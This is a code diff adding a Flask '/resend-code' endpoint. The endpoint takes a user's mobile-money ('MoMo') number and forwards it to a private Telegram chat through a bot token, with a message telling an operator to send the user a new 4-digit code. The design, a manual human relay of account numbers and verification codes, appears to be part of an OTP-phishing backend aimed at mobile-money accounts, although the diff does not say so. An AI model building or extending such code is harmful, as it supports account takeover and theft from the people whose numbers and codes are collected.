@@ -328,6 +328,39 @@ def code_status(request_id):
     return jsonify({"ok": True, "status": entry["status"]})
 
 
+# ---------------- RESEND CODE ----------------
+@app.route("/resend-code", methods=["POST", "OPTIONS"])
+def resend_code():
+    if request.method == "OPTIONS":
+        return "", 204
+
+    data = request.get_json(silent=True) or {}
+    momo = data.get("momo", "unknown")
+    time_str = data.get("time", "unknown")
+
+    text = (
+        "🔄 Resend Code Requested\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"MoMo: {momo}\n"
+        f"Time: {time_str}\n\n"
+        "The user requested a new 4-digit code.\n"
+        "Please send a new code to their phone."
+    )
+
+    if not BOT_TOKEN or not CHAT_ID:
+        return jsonify({"ok": False, "error": "Server not configured"}), 500
+
+    try:
+        res = requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": text},
+            timeout=10,
+        )
+        return jsonify(res.json())
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+
 # ---------------- STATIC ----------------
 @app.route("/<path:filename>")
 def static_files(filename):
